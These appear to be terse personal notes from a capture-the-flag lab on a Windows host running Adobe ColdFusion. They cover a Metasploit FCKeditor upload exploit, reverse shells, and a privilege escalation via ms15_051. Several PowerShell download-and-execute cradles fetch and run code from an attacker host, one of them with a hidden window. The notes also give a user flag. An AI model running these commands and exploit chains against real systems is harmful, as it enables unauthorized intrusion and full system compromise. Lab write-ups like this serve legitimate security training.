fmtp server is open so got the hit of adobe coldfusion find the version from base.m file in ani somewhere in top

got the version and exploit is there for arbitary file upload

windows/http/coldfusion_fckeditor

as server is slow so it got failed. in options there is option to add proxy as well but created the proxy in burp and setted up a redirect which will redirect from localhost and port 8500 to 10.10.10.11:8500 

started the netcat -lvnp 4444

got the initial foothold and user.txt

02650d3a69a70780c302e146a6cb96f3

powershell "IEX(New-Object Net.Webclient).downloadString('http://10.10.14.9:8000/exploit.html')"

to invoke the download and run the code

powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.9:8000/exploit.exe', 'exploit.exe')"

to invoke the download and run the file

it might work but might not so worked one time but not next

---------------------

as exploit is ready and upload opened msfconsole and directly took the shell rather then netcat

exploit/multi/handle

set payload java/jsp_shell_reverse_tcp

set lhost

set lport

got the shell

after this issue was with powershell code delivery so we got the multi/script/web_delivery

set payload windows/x64/meterpreter/reverse_tcp

set lhost

set lport

set SRVport

exploit

it will generate the shell code of powershell

interact with first sesions and run the powerhshell code

powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://10.10.14.9:8001/nd6bRNwX4YTd');

it gave another session as we are in 32 bit process

migrated to a stable process as adobe is running moved there.

got the 64 bit process.

time for exploit suggester

schelevator failed in this case
rec_notf failed
reflecion failed

ms15_051_client_copy_image worked like charm

set target 1

set payload windows/x64/meterpreter/reverse_tcp

set lhost
set lport

exploit and we got the root shell
